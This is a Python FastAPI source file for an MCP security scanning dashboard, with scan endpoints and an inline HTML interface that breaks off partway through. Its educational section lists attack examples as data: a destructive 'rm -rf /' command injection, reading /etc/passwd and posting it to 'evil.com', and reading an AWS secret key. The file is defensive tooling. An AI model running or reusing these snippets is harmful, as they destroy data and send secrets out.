#!/usr/bin/env python3
"""
Mighty MCP Security Dashboard - FastAPI Version
Comprehensive web interface for all MCP security scanning capabilities
"""

import os
import re
import sys
import tempfile
import uuid
from datetime import datetime
from pathlib import Path

from fastapi import FastAPI, File, HTTPException, Request, UploadFile
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

# Load .env file if it exists
env_file = Path(__file__).parent.parent.parent / '.env'
if env_file.exists():
    with open(env_file) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#') and '=' in line:
                key, value = line.split('=', 1)
                os.environ[key] = value

# Add parent directory to path for imports
sys.path.append(str(Path(__file__).parent.parent.parent))

# Import security middleware
try:
    from security_middleware import SecurityValidator, safe_error_handler, security_middleware
    SECURITY_ENABLED = True
except ImportError:
    print("Warning: Security middleware not found, running without enhanced security")
    SECURITY_ENABLED = False

from src.analyzers.comprehensive_mcp_analyzer import ComprehensiveMCPAnalyzer
from src.analyzers.database import AnalysisCacheDB
from src.analyzers.llm.cerebras_analyzer import CerebrasAnalyzer
from src.configs.discovery import ConfigDiscovery
from src.policies.manager import PolicyManager
from src.runtime.session import SessionManager
from src.signatures.manager import SignatureManager

app = FastAPI(
    title="Mighty MCP Security Dashboard",
    description="Comprehensive security scanning for MCP tools and configurations",
    version="2.0.0"
)

# Add security middleware if available
if SECURITY_ENABLED:
    app.middleware("http")(security_middleware)

# Add CORS middleware with proper security settings
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",  # Dev frontend
        "http://localhost:3002",  # Vite dev server
        "http://localhost:8080",  # Production frontend
        "http://localhost:8083",  # Alternative port
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "OPTIONS"],
    allow_headers=["*"],
    max_age=3600,
)

# Mount static files directory
static_dir = Path(__file__).parent / "static"
if not static_dir.exists():
    static_dir.mkdir()
app.mount("/static", StaticFiles(directory=str(static_dir)), name="static")

# Global instances for analyzers
comprehensive_analyzer = ComprehensiveMCPAnalyzer()
config_discovery = ConfigDiscovery()
signature_manager = SignatureManager()
policy_manager = PolicyManager()
session_manager = SessionManager()

# Check if LLM is available
try:
    cerebras_analyzer = CerebrasAnalyzer()
    LLM_AVAILABLE = True
except Exception:
    cerebras_analyzer = None
    LLM_AVAILABLE = False

def get_db():
    """Get database connection for current thread"""
    return AnalysisCacheDB()

# REAL scan modes - only what ACTUALLY works
SCAN_MODES = {
    "github_scan": {
        "name": "GitHub Repository Scanner",
        "description": "Analyze ANY GitHub repository for security threats",
        "capabilities": [
            "✅ Automatic repository cloning",
            "✅ Full AST-based code analysis",
            "✅ 50+ threat pattern detection",
            "✅ Secret/credential scanning",
            "✅ Command injection detection",
            "✅ Threat score 0-100"
        ],
        "when_to_use": "Paste any GitHub URL (e.g. https://github.com/user/repo) to scan before installing",
        "icon": "🐙",
        "risk_level": "WORKING"
    },
    "local_scan": {
        "name": "Local File/Directory Scanner",
        "description": "Scan files or entire directories on your computer",
        "capabilities": [
            "✅ Single file or full directory",
            "✅ Same powerful analysis as GitHub",
            "✅ All threat detection features",
            "✅ Detailed threat reports",
            "✅ Line-by-line analysis"
        ],
        "when_to_use": "Enter a file path (e.g. /path/to/file.py) or directory path to scan locally",
        "icon": "📁",
        "risk_level": "WORKING"
    },
    "quick_scan": {
        "name": "Quick Mode (Fast Scan)",
        "description": "Faster scanning that skips deep analysis - good for large repos",
        "capabilities": [
            "✅ 5-10x faster than deep scan",
            "✅ Still catches major threats",
            "✅ Good for initial assessment",
            "✅ Works with GitHub or local"
        ],
        "when_to_use": "Add any target and we'll scan it quickly. Best for large codebases.",
        "icon": "⚡",
        "risk_level": "WORKING"
    }
}

@app.get("/health")
async def health_check():
    """Health check endpoint for monitoring"""
    return {
        "status": "healthy",
        "version": "2.0.0",
        "security": SECURITY_ENABLED,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/")
async def index():
    """Serve the React app"""
    # Check for built React app first
    react_build = Path(__file__).parent / "static" / "dist" / "index.html"
    if react_build.exists():
        return FileResponse(react_build)

    # Fallback to legacy HTML
    html_file = Path(__file__).parent / "static" / "dashboard.html"
    if html_file.exists():
        return FileResponse(html_file)
    else:
        # Fallback to inline HTML if file doesn't exist
        return HTMLResponse(content=get_dashboard_html())

# Serve React app static files
react_static_dir = Path(__file__).parent / "static" / "dist"
if react_static_dir.exists():
    app.mount("/assets", StaticFiles(directory=str(react_static_dir / "assets")), name="react-assets")

@app.get("/api/scan-modes")
async def get_scan_modes():
    """Get information about all available scan modes"""
    return JSONResponse(content=SCAN_MODES)


@app.post("/api/scan/local")
async def scan_local(request: Request):
    """Scan a local file or directory using the comprehensive analyzer"""
    data = await request.json()
    target_path = data.get('target_path')

    if not target_path:
        raise HTTPException(status_code=400, detail="No target path provided")

    # Validate path if security is enabled
    if SECURITY_ENABLED:
        try:
            target_path = SecurityValidator.validate_local_path(target_path)
        except ValueError as e:
            raise HTTPException(status_code=400, detail=str(e))

    try:
        # Use the ACTUAL working analyzer with profile support
        analyzer = ComprehensiveMCPAnalyzer(
            verbose=True,
            deep_scan=not data.get('quick_mode', False),
            enable_llm=data.get('enable_llm', False),
            profile=data.get('profile', 'production')  # Add profile support
        )

        # This handles both files and directories!
        report = analyzer.analyze_repository(target_path)

        # Extract name for local files/directories
        path_obj = Path(target_path)
        if path_obj.is_file():
            display_name = f"Local: {path_obj.name}"
        else:
            display_name = f"Local: {path_obj.name or path_obj.parent.name}"
        
        # Store in database
        db = get_db()
        run_id = db.store_analysis_run(
            repo_url=f"file://{target_path}",
            scan_type="local",
            threat_level=report.threat_level,
            threat_score=report.threat_score * 100,  # Convert to percentage
            total_threats=len(report.threats_found)
        )
        
        # Store repository metadata with proper name
        db.store_repository(
            repo_url=f"file://{target_path}",
            repo_name=display_name,
            latest_commit_sha='local',
            scan_timestamp=datetime.now()
        )

        # Store detailed threats
        for threat in report.threats_found:
            db.store_threat(
                run_id=run_id,
                attack_vector=str(threat.attack_vector),
                severity=str(threat.severity),  # Convert enum to string
                confidence=threat.confidence,
                file_path=threat.file_path,
                line_numbers=threat.line_numbers,
                description=threat.description,
                evidence=threat.evidence
            )

        return {
            'run_id': run_id,
            'target': target_path,
            'threats': [{
                'attack_vector': str(t.attack_vector),
                'severity': t.severity,
                'confidence': t.confidence,
                'description': t.description,
                'file_path': t.file_path,
                'line_numbers': t.line_numbers
            } for t in report.threats_found],
            'threat_score': f"{report.threat_score * 100:.1f}%",
            'threat_level': report.threat_level,
            'total_files': report.total_files_scanned,
            'total_lines': report.total_lines_analyzed,
            'analysis_complete': True
        }

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/scan/config-discovery")
async def scan_config_discovery():
    """Discover and analyze all MCP configurations"""
    try:
        configs = config_discovery.discover_all()

        results = {
            'configs_found': len(configs),
            'clients': {},
            'total_servers': 0,
            'total_threats': 0
        }

        for config in configs:
            client_name = config['client']
            config_data = config['config']

            if not config_data:
                continue

            servers = config_data.get('mcpServers', config_data.get('servers', {}))

            results['clients'][client_name] = {
                'path': config['path'],
                'servers': list(servers.keys()),
                'server_count': len(servers),
                'threats': []
            }

            results['total_servers'] += len(servers)

            # Analyze each server
            for server_name, server_def in servers.items():
                # Verify signature
                sig_result = signature_manager.verify_tool({
                    'name': server_name,
                    'description': server_def.get('description', ''),
                    'parameters': server_def
                })

                if sig_result['threat_level'] in ['high', 'critical']:
                    results['clients'][client_name]['threats'].append({
                        'server': server_name,
                        'threat': sig_result['status'],
                        'level': sig_result['threat_level']
                    })
                    results['total_threats'] += 1

        return results

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/scan/github")
async def scan_github_repo(request: Request):
    """Scan a GitHub repository using the WORKING analyzer"""
    data = await request.json()
    repo_url = data.get('repo_url')

    if not repo_url or 'github.com' not in repo_url:
        raise HTTPException(status_code=400, detail="Invalid GitHub URL")

    # Validate GitHub URL if security is enabled
    if SECURITY_ENABLED:
        try:
            repo_url = SecurityValidator.validate_github_url(repo_url)
        except ValueError as e:
            raise HTTPException(status_code=400, detail=str(e))

    try:
        # Use the ACTUAL working analyzer that handles GitHub properly with profile support!
        analyzer = ComprehensiveMCPAnalyzer(
            verbose=True,
            deep_scan=not data.get('quick_mode', False),
            enable_llm=data.get('enable_llm', False),
            profile=data.get('profile', 'production')  # Add profile support
        )

        # This already handles GitHub cloning and everything!
        report = analyzer.analyze_repository(repo_url)

        # Extract repo name for display - handle various GitHub URL formats
        match = re.search(r'github\.com[:/]([^/]+)/([^/.?#]+)', repo_url)
        if match:
            repo_name = f"{match.group(1)}/{match.group(2)}"
            # Remove .git extension if present
            repo_name = repo_name.replace('.git', '')
        else:
            # Fallback to last part of URL
            repo_name = repo_url.split('/')[-1].replace('.git', '')

        # Store in database
        db = get_db()
        run_id = db.store_analysis_run(
            repo_url=repo_url,
            scan_type="github",
            threat_level=report.threat_level,
            threat_score=report.threat_score * 100,  # Convert to percentage
            total_threats=len(report.threats_found)
        )

        # Store repo metadata
        db.store_repository(
            repo_url=repo_url,
            repo_name=repo_name,
            latest_commit_sha=report.merkle_root[:40],  # Use merkle root as commit reference
            scan_timestamp=datetime.now()
        )

        # Store detailed threats
        for threat in report.threats_found:
            db.store_threat(
                run_id=run_id,
                attack_vector=str(threat.attack_vector),
                severity=str(threat.severity),  # Convert enum to string
                confidence=threat.confidence,
                file_path=threat.file_path,
                line_numbers=threat.line_numbers,
                description=threat.description,
                evidence=threat.evidence
            )

        return {
            'run_id': run_id,
            'repo': repo_name,
            'threats': [{
                'attack_vector': str(t.attack_vector),
                'severity': t.severity,
                'confidence': f"{t.confidence * 100:.0f}%",
                'description': t.description,
                'file_path': t.file_path,
                'line_numbers': t.line_numbers
            } for t in report.threats_found],
            'threat_score': f"{report.threat_score * 100:.1f}%",
            'threat_level': report.threat_level,
            'confidence': f"{report.confidence * 100:.0f}%",
            'total_files': report.total_files_scanned,
            'total_lines': f"{report.total_lines_analyzed:,}",
            'fingerprints': {
                'sha512': report.sha512_fingerprint[:64] + '...',
                'sha3_512': report.sha3_512_fingerprint[:64] + '...',
                'merkle_root': report.merkle_root[:32] + '...'
            },
            'analysis_complete': True
        }

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/scan/signature-verify")
async def verify_signatures(request: Request):
    """Verify tool signatures"""
    data = await request.json()
    tools = data.get('tools', [])

    results = {
        'tools_checked': len(tools),
        'signatures': {},
        'threats_detected': []
    }

    for tool in tools:
        sig_result = signature_manager.verify_tool(tool)
        results['signatures'][tool['name']] = sig_result

        if sig_result['threat_level'] in ['high', 'critical']:
            results['threats_detected'].append({
                'tool': tool['name'],
                'threat': sig_result['status'],
                'level': sig_result['threat_level']
            })

    return results

@app.post("/api/scan/policy-check")
async def check_policies(request: Request):
    """Check tools against security policies"""
    data = await request.json()

    client = data.get('client', 'default')
    server = data.get('server', 'default')
    tools = data.get('tools', [])

    results = {
        'policies_evaluated': 0,
        'violations': [],
        'recommendations': []
    }

    # Get applicable policies
    policies = policy_manager.get_policies(client, server)
    results['policies_evaluated'] = len(policies)

    for policy in policies:
        for tool in tools:
            violation = await policy_manager.evaluate_tool(tool, policy)
            if violation:
                results['violations'].append(violation)

    # Add recommendations
    if results['violations']:
        results['recommendations'] = [
            "Review and update tool permissions",
            "Consider using alternative tools",
            "Implement additional monitoring"
        ]

    return results

@app.post("/api/scan/unified")
async def unified_scan(request: Request):
    """Run comprehensive unified scan"""
    data = await request.json()
    target = data.get('target')
    scan_type = data.get('type', 'auto')  # auto, file, directory, github

    try:
        results = {
            'scan_id': str(uuid.uuid4()),
            'timestamp': datetime.now().isoformat(),
            'target': target,
            'scan_type': scan_type,
            'analyses_performed': [],
            'total_threats': 0,
            'threat_breakdown': {},
            'recommendations': []
        }

        # Determine scan type
        if scan_type == 'auto':
            if 'github.com' in target:
                scan_type = 'github'
            elif Path(target).is_file():
                scan_type = 'file'
            elif Path(target).is_dir():
                scan_type = 'directory'

        # Run appropriate scans
        if scan_type == 'file':
            report = await comprehensive_analyzer.analyze_file(target)
            results['analyses_performed'].append('static_analysis')
            results['total_threats'] = len(report.threats_found)
            results['threat_breakdown']['static'] = report.threats_found

            # Signature verification
            sig_result = signature_manager.verify_tool({'name': Path(target).name, 'path': target})
            results['analyses_performed'].append('signature_verification')
            results['threat_breakdown']['signature'] = sig_result

            # Policy check
            if policy_manager:
                policy_result = await policy_manager.evaluate_file(target)
                results['analyses_performed'].append('policy_evaluation')
                results['threat_breakdown']['policy'] = policy_result

        elif scan_type == 'github':
            # Similar to github scan above
            results['analyses_performed'].append('github_analysis')
            # ... implementation

        # Generate recommendations based on threats
        if results['total_threats'] > 0:
            results['recommendations'] = generate_recommendations(results['threat_breakdown'])

        return results

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/scan/learning-mode")
async def get_learning_content():
    """Get educational content about scan modes"""
    learning_content = {
        "basics": {
            "title": "MCP Security Basics",
            "content": """
            Model Context Protocol (MCP) servers provide tools that AI assistants can use.
            These tools can be powerful but also potentially dangerous if not properly secured.
            
            Key risks include:
            - Command injection through unsanitized inputs
            - Data exfiltration via network tools
            - Credential theft from environment variables
            - Rug pull attacks where tools change after trust is established
            """
        },
        "threat_types": {
            "title": "Common MCP Threats",
            "threats": [
                {
                    "name": "Command Injection",
                    "description": "Malicious commands executed through tool parameters",
                    "example": "exec('rm -rf /' + user_input)",
                    "detection": "Static analysis, pattern matching"
                },
                {
                    "name": "Data Exfiltration",
                    "description": "Sensitive data sent to external servers",
                    "example": "read_file('/etc/passwd') → http_post('evil.com')",
                    "detection": "Toxic flow analysis, network monitoring"
                },
                {
                    "name": "Credential Theft",
                    "description": "Stealing API keys, passwords, tokens",
                    "example": "os.environ['AWS_SECRET_KEY']",
                    "detection": "Secret scanning, entropy analysis"
                },
                {
                    "name": "Rug Pull Attack",
                    "description": "Tools changing behavior after being trusted",
                    "example": "Benign tool updates to include malware",
                    "detection": "Signature verification, mutation tracking"
                }
            ]
        },
        "best_practices": {
            "title": "Security Best Practices",
            "practices": [
                "Always scan tools before installation",
                "Use signature verification for trusted tools",
                "Enable policy enforcement for production",
                "Regularly update signature database",
                "Monitor runtime behavior when possible",
                "Use LLM analysis for sophisticated threats"
            ]
        }
    }

    return learning_content

@app.get("/api/tasks")
async def get_tasks():
    """Get all tasks (for now return empty array as tasks are not persisted)"""
    # TODO: Implement task persistence if needed
    return []

@app.post("/api/tasks/{task_id}/cancel")
async def cancel_task(task_id: str):
    """Cancel a running task"""
    # TODO: Implement actual task cancellation logic
    return {"status": "cancelled", "task_id": task_id}

@app.get("/api/stats")
async def get_stats():
    """Get overall statistics"""
    db = get_db()
    stats = db.get_threat_statistics()

    # Get recent scans
    cursor = db.conn.cursor()
    cursor.execute("""
        SELECT r.run_id, r.repo_url, r.scan_timestamp, r.threat_level, 
               r.threat_score, r.total_threats, r.scan_type, r.llm_enabled,
               repo.repo_name, repo.latest_commit_sha
        FROM analysis_runs r
        LEFT JOIN repositories repo ON r.repo_url = repo.repo_url
        ORDER BY r.scan_timestamp DESC
        LIMIT 10
    """)

    recent_scans = []
    rows = cursor.fetchall()
    for row in rows:
        # Handle both dict-like and tuple-like access
        if hasattr(row, '__getitem__') and hasattr(row, 'keys'):
            # Row object (dict-like)
            recent_scans.append({
                'run_id': row['run_id'],
                'repo_name': row['repo_name'] or Path(row['repo_url']).name,
                'repo_url': row['repo_url'],
                'timestamp': row['scan_timestamp'],
                'threat_level': row['threat_level'],
                'threat_score': row['threat_score'],
                'total_threats': row['total_threats'],
                'scan_type': row['scan_type'],
                'llm_enabled': row['llm_enabled']
            })
        else:
            # Tuple access (fallback)
            recent_scans.append({
                'run_id': row[0],
                'repo_name': row[9] or Path(row[1]).name if row[9] is not None else Path(row[1]).name,
                'repo_url': row[1],
                'timestamp': row[2],
                'threat_level': row[3],
                'threat_score': row[4],
                'total_threats': row[5],
                'scan_type': row[6],
                'llm_enabled': row[7]
            })

    return {
        'statistics': stats,
        'recent_scans': recent_scans,
        'scan_modes_available': len([m for m in SCAN_MODES.values() if m.get('availability', True)]),
        'llm_available': LLM_AVAILABLE
    }

@app.get("/api/run/{run_id}")
async def get_run(run_id: str):
    """Get details of a specific analysis run"""
    db = get_db()

    try:
        data = db.export_to_json(run_id)
        return JSONResponse(content=data)
    except Exception as e:
        raise HTTPException(status_code=404, detail=f"Run not found: {str(e)}")

@app.post("/api/upload-and-scan")
async def upload_and_scan(file: UploadFile = File(...)):
    """Upload a file and scan it"""
    try:
        # Save uploaded file to temp location
        with tempfile.NamedTemporaryFile(delete=False, suffix=Path(file.filename).suffix) as tmp:
            content = await file.read()
            tmp.write(content)
            tmp_path = tmp.name

        # Scan the file
        report = await comprehensive_analyzer.analyze_file(tmp_path)

        # Clean up
        os.unlink(tmp_path)

        return {
            'filename': file.filename,
            'threats': report.threats_found,
            'threat_score': report.threat_score,
            'severity_level': report.severity_level
        }

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

def generate_recommendations(threat_breakdown: dict) -> list[str]:
    """Generate security recommendations based on threats found"""
    recommendations = []

    if 'static' in threat_breakdown:
        for threat in threat_breakdown['static']:
            if threat.get('attack_vector') == 'COMMAND_INJECTION':
                recommendations.append("Implement input validation and sanitization")
            elif threat.get('attack_vector') == 'CREDENTIAL_THEFT':
                recommendations.append("Use secure credential storage (e.g., environment variables, secret managers)")
            elif threat.get('attack_vector') == 'DATA_EXFILTRATION':
                recommendations.append("Implement network egress controls and monitoring")

    if 'signature' in threat_breakdown:
        sig = threat_breakdown['signature']
        if sig.get('changed'):
            recommendations.append("Review tool changes and re-verify trust")
        if sig.get('status') == 'blacklisted':
            recommendations.append("Remove blacklisted tool immediately")

    if 'policy' in threat_breakdown:
        recommendations.append("Update security policies to address violations")

    return list(set(recommendations))  # Remove duplicates

# Catch-all route for React Router (SPA) - MUST BE LAST
@app.get("/{path:path}")
async def catch_all(path: str):
    """Catch-all route to serve React app for SPA routing"""
    # Skip API routes
    if path.startswith("api/"):
        raise HTTPException(status_code=404, detail="API endpoint not found")

    # Check for built React app
    react_build = Path(__file__).parent / "static" / "dist" / "index.html"
    if react_build.exists():
        return FileResponse(react_build)

    # Fallback to legacy dashboard
    html_file = Path(__file__).parent / "static" / "dashboard.html"
    if html_file.exists():
        return FileResponse(html_file)
    else:
        return HTMLResponse(content=get_dashboard_html())

def get_dashboard_html():
    """Return the full dashboard HTML with enhanced reporting"""
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>🛡️ Mighty MCP Security Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #6366f1; --primary-dark: #4f46e5; --success: #10b981;
            --warning: #f59e0b; --danger: #ef4444; --info: #3b82f6;
            --dark: #1f2937; --light: #f9fafb; --border: #e5e7eb;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; padding: 20px;
        }
        .container {
            max-width: 1400px; margin: 0 auto; background: white;
            border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white; padding: 30px; display: flex;
            justify-content: space-between; align-items: center;
        }
        .header h1 { font-size: 2.5rem; display: flex; align-items: center; gap: 15px; }
        .stats { display: flex; gap: 30px; }
        .stat-item { text-align: center; }
        .stat-value { font-size: 2rem; font-weight: bold; }
        .stat-label { font-size: 0.9rem; opacity: 0.9; }
        .nav-tabs {
            display: flex; background: var(--light);
            border-bottom: 2px solid var(--border); overflow-x: auto;
        }
        .nav-tab {
            padding: 20px 30px; cursor: pointer; border: none;
            background: none; font-size: 1rem; color: var(--dark);
            transition: all 0.3s; white-space: nowrap; position: relative;
        }
        .nav-tab:hover { background: white; }
        .nav-tab.active { background: white; color: var(--primary); font-weight: 600; }
        .nav-tab.active::after {
            content: ''; position: absolute; bottom: -2px; left: 0;
            right: 0; height: 3px; background: var(--primary);
        }
        .content { padding: 30px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .scan-modes-grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px; margin-top: 20px;
        }
        .scan-mode-card {
            border: 2px solid var(--border); border-radius: 12px;
            padding: 20px; transition: all 0.3s; cursor: pointer;
            position: relative; overflow: hidden;
        }
        .scan-mode-card:hover {
            border-color: var(--primary); transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.2);
        }
        .scan-mode-card.selected {
            border-color: var(--primary);
            background: linear-gradient(to bottom right, rgba(99, 102, 241, 0.05), rgba(99, 102, 241, 0.1));
        }
        .scan-mode-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
        .scan-mode-icon { font-size: 2rem; }
        .scan-mode-title { flex: 1; }
        .scan-mode-name { font-size: 1.2rem; font-weight: 600; color: var(--dark); }
        .scan-mode-risk {
            font-size: 0.8rem; padding: 4px 8px; border-radius: 4px;
            background: var(--success); color: white;
        }
        .scan-mode-risk.preview { background: var(--warning); }
        .scan-mode-description { color: #6b7280; margin-bottom: 15px; line-height: 1.5; }
        .scan-controls {
            margin-top: 30px; padding: 25px; background: var(--light);
            border-radius: 12px;
        }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; font-weight: 500; color: var(--dark); }
        .input-group input, .input-group select {
            width: 100%; padding: 12px; border: 2px solid var(--border);
            border-radius: 8px; font-size: 1rem; transition: border-color 0.3s;
        }
        .input-group input:focus { outline: none; border-color: var(--primary); }
        .btn {
            padding: 12px 30px; border: none; border-radius: 8px;
            font-size: 1rem; font-weight: 600; cursor: pointer;
            transition: all 0.3s; display: inline-flex;
            align-items: center; gap: 10px;
        }
        .btn-primary { background: var(--primary); color: white; }
        .btn-primary:hover {
            background: var(--primary-dark); transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
        }
        .btn-secondary {
            background: var(--light); color: var(--dark);
            border: 2px solid var(--border);
        }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .results-container {
            margin-top: 30px; padding: 20px; background: #f8fafc;
            border-radius: 12px; display: none;
        }
        .results-container.show { display: block; }
        .threat-card {
            background: white; border: 1px solid var(--border);
            border-radius: 8px; padding: 15px; margin-bottom: 15px;
        }
        .threat-header {
            display: flex; justify-content: space-between;
            align-items: center; margin-bottom: 10px;
        }
        .threat-severity {
            padding: 4px 12px; border-radius: 20px;
            font-size: 0.85rem; font-weight: 600;
        }
        .severity-critical { background: #fee2e2; color: #dc2626; }
        .severity-high { background: #fef3c7; color: #d97706; }
        .severity-medium { background: #dbeafe; color: #2563eb; }
        .severity-low { background: #d1fae5; color: #059669; }
        .learning-card {
            background: white; border: 2px solid var(--border);
            border-radius: 12px; padding: 20px; margin: 20px 0;
        }
        .learning-card h3 { color: var(--primary); margin-bottom: 15px; }
        .capability-list { list-style: none; font-size: 0.9rem; }
        .capability-list li {
            padding: 5px 0; color: #4b5563; display: flex;
            align-items: center; gap: 8px;
        }
        .capability-list li::before { content: '✓'; color: var(--success); font-weight: bold; }
        .progress-bar {
            width: 100%; height: 30px; background: var(--light);
            border-radius: 15px; overflow: hidden; margin: 20px 0;
        }
        .progress-fill {
            height: 100%; background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            transition: width 0.3s; display: flex; align-items: center;
            justify-content: center; color: white; font-weight: 600;
        }
        .checkbox-group { display: flex; gap: 20px; margin: 15px 0; }
        .checkbox-label { display: flex; align-items: center; gap: 8px; cursor: pointer; }
        .checkbox-label input[type="checkbox"] { width: 18px; height: 18px; cursor: pointer; }
        .modal {
            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center;
        }
        .modal.show { display: flex; }
        .modal-content {
            background: white; border-radius: 12px; padding: 30px;
            max-width: 800px; width: 90%; max-height: 80vh; overflow-y: auto;
        }
        .modal-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 20px; border-bottom: 2px solid var(--border); padding-bottom: 15px;
        }
        .modal-close {
            background: none; border: none; font-size: 1.5rem;
            cursor: pointer; color: #6b7280;
        }
        .threat-score-badge {
            display: inline-block; padding: 8px 16px; border-radius: 20px;
            font-weight: bold; font-size: 1.2rem; margin: 10px 0;
        }
        .score-critical { background: #dc2626; color: white; }
        .score-high { background: #f59e0b; color: white; }
        .score-medium { background: #3b82f6; color: white; }
        .score-low { background: #10b981; color: white; }
        .score-safe { background: #059669; color: white; }
        .stat-explanation {
            font-size: 0.8rem; color: #6b7280; margin-top: 4px;
        }
        .history-table {
            width: 100%; border-collapse: collapse; margin-top: 20px;
        }
        .history-table th, .history-table td {
            padding: 12px; text-align: left; border-bottom: 1px solid var(--border);
        }
        .history-table th { background: var(--light); font-weight: 600; }
        .history-table tr:hover { background: var(--light); }
        .threat-detail-section {
            margin: 20px 0; padding: 15px; background: var(--light); border-radius: 8px;
        }
        .threat-metric {
            display: flex; justify-content: space-between; padding: 8px 0;
            border-bottom: 1px solid var(--border);
        }
        .threat-metric:last-child { border-bottom: none; }
        .metric-label { font-weight: 600; color: var(--dark); }
        .metric-value { color: #4b5563; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><span>🛡️</span><span>Mighty MCP Security Dashboard</span></h1>
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-value" id="totalScans">0</div>
                    <div class="stat-label">Total Scans</div>
                    <div class="stat-explanation">Files & repos analyzed</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="threatsFound">0</div>
                    <div class="stat-label">Active Threats</div>
                    <div class="stat-explanation">Unresolved security issues</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="threatScore">0</div>
                    <div class="stat-label">Risk Score</div>
                    <div class="stat-explanation">0-100 (lower is safer)</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="llmStatus">🔴</div>
                    <div class="stat-label">AI Analysis</div>
                    <div class="stat-explanation">Advanced detection</div>
                </div>
            </div>
        </div>
        <div class="nav-tabs">
            <button class="nav-tab active" onclick="switchTab('scanner', event)">🔍 Scanner</button>
            <button class="nav-tab" onclick="switchTab('learning', event)">📚 Learning Center</button>
            <button class="nav-tab" onclick="switchTab('history', event)">📊 Scan History</button>
        </div>
        <div class="content">
            <div id="scanner" class="tab-content active">
                <h2>Select Scan Mode</h2>
                <p style="color: #6b7280; margin-top: 10px;">
                    Choose the appropriate scan mode based on your security needs. Click each mode to learn more.
                </p>
                <div class="scan-modes-grid" id="scanModesGrid"></div>
                <div class="scan-controls">
                    <h3>Scan Configuration</h3>
                    <div class="input-group">
                        <label for="scanTarget">Target (File/Directory/URL)</label>
                        <input type="text" id="scanTarget" placeholder="Enter path or GitHub URL...">
                    </div>
                    <div class="checkbox-group">
                        <label class="checkbox-label">
                            <input type="checkbox" id="enableLLM">
                            <span>Enable AI Analysis</span>
                        </label>
                        <label class="checkbox-label">
                            <input type="checkbox" id="deepScan">
                            <span>Deep Scan Mode</span>
                        </label>
                    </div>
                    <button class="btn btn-primary" onclick="startScan()">
                        <span>🚀</span><span>Start Security Scan</span>
                    </button>
                    <button class="btn btn-secondary" onclick="runQuickScan()">
                        <span>⚡</span><span>Quick Config Discovery</span>
                    </button>
                </div>
                <div id="scanProgress" class="progress-bar" style="display: none;">
                    <div class="progress-fill" id="progressFill">0%</div>
                </div>
                <div id="scanResults" class="results-container"></div>
            </div>
            <div id="learning" class="tab-content">
                <h2>MCP Security Learning Center</h2>
                <div class="learning-card">
                    <h3>🎯 What Our Tooling Does</h3>
                    <p>The Mighty MCP Security Scanner provides comprehensive protection against malicious MCP tools:</p>
                    <ul class="capability-list">
                        <li>Static code analysis using AST parsing to detect vulnerabilities</li>
                        <li>Pattern matching for 50+ known attack vectors</li>
                        <li>Secret and credential detection with entropy analysis</li>
                        <li>Signature verification to detect tool tampering (rug pulls)</li>
                        <li>Policy enforcement with custom security rules</li>
                        <li>AI-powered semantic vulnerability detection</li>
                        <li>GitHub repository scanning before installation</li>
                        <li>Configuration discovery across all MCP clients</li>
                    </ul>
                </div>
                <div class="learning-card">
                    <h3>⚠️ Common MCP Threats</h3>
                    <p><strong>Command Injection:</strong> Malicious commands executed through tool parameters</p>
                    <p><strong>Data Exfiltration:</strong> Sensitive data sent to external servers</p>
                    <p><strong>Credential Theft:</strong> Stealing API keys and tokens</p>
                    <p><strong>Rug Pull Attacks:</strong> Tools changing behavior after being trusted</p>
                </div>
                <div class="learning-card">
                    <h3>🛡️ Best Practices</h3>
                    <ul class="capability-list">
                        <li>Always scan tools before installation</li>
                        <li>Use signature verification for trusted tools</li>
                        <li>Enable policy enforcement in production</li>
                        <li>Keep signature database updated</li>
                        <li>Use AI analysis for sophisticated threats</li>
                    </ul>
                </div>
            </div>
            <div id="history" class="tab-content">
                <h2>Scan History & Reports</h2>
                <p style="color: #6b7280; margin-top: 10px;">Click "View Details" to see the full security analysis report for each scan.</p>
                <div id="scanHistoryContainer">
                    <table class="history-table">
                        <thead>
                            <tr>
                                <th>Date & Time</th>
                                <th>Target</th>
